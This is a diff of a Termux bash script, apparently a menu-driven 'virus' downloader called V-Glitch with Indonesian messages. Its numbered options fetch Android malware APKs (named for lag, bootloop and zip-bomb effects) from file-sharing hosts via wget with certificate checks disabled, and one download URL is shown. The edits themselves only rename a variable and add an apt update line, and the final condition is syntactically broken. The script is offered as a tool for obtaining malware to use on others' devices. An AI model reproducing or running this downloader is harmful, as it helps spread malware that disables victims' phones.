@@ -1,5 +1,6 @@
 #!/usr/bin/bash
 #import sys os
+apt update&&apt upgrade -y
 pkg install wget -y
 pkg install toilet -y
 pkg install figlet -y
@@ -30,9 +31,9 @@ echo "5.> Virus Elite"
 echo "0.>exit"
 echo ""
 echo "<======================================>"
-read -p "root@V-Glitch-#" asw
+read -p "root@V-Glitch-#" code
 
-if [ $asw = 1 ] || [ $asw = 1 ]
+if [ $code = 1 ] || [ $code = 1 ]
 then
 clear
 figlet Downloading Virus
@@ -41,7 +42,7 @@ mv virus_data.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $asw = 2 ] || [ $asw = 2 ]
+if [ $code = 2 ] || [ $code = 2 ]
 then
 clear
 figlet Downloading Virus
@@ -50,7 +51,7 @@ mv virus_lag.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $asw = 3 ] || [ $asw = 3 ]
+if [ $code = 3 ] || [ $code = 3 ]
 then
 clear
 figlet Downloading Virus
@@ -59,7 +60,7 @@ mv virus_bootloop.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $asw = 4 ] || [ $asw = 4 ]
+if [ $code = 4 ] || [ $code = 4 ]
 then
 clear
 figlet Downloading Virus
@@ -68,7 +69,7 @@ mv bom_zip.apk virus_android
 echo "Done tinggal liat virus di folder virus_android"
 fi
 
-if [ $asw = 5 ] || [ $asw = 5 ]
+if [ $code = 5 ] || [ $code = 5 ]
 then
 clear
 figlet Downloading Virus
@@ -76,7 +77,7 @@ wget --no-check-certificate https://www24.zippyshare.com/d/yc2Nat3W/32/virus_eli
 mv virus_elite.apk virus_android
 fi
 
-if [ $asw = 0 ] || [ $asw = 0]
+if [ $code = 0 ] || [ $code = 00]
 clear
 echo "Terimakasih Telah Menggunakan Tools ini :)"
 sleep 2
